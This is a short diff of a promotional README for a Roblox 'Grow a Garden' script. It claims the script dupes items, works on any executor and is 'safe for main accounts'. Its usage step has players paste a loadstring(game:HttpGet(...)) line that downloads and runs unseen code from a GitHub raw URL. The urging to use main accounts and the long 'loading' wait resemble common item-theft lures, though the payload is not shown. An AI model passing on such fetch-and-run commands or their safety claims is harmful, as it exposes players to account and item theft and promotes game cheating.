@@ -2,8 +2,6 @@ GROW A GARDEN SCRIPT 🌱
 ✅ Works on any executor
 ✅ Safe for main accounts
 ✅ Lets you trade and gift duped, and candy blossom items! 🤫
-❗ Only works on old accounts 
-
 
 📜 How to Use:
 
@@ -23,9 +21,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/LATESTSCRIPTGAG/GROWA
 5. Done — enjoy!
 
 
-⚠️ Note:
-🔥This script won’t work on new accounts.🔥
-‼️Make Sure to Use Your Main Account As Newer Accounts Are Detected As Bots and Spams
+⚠️ Note! 
 ⭕Be patient — the script takes a 1-15 minutes to fully load!⭕
 
 
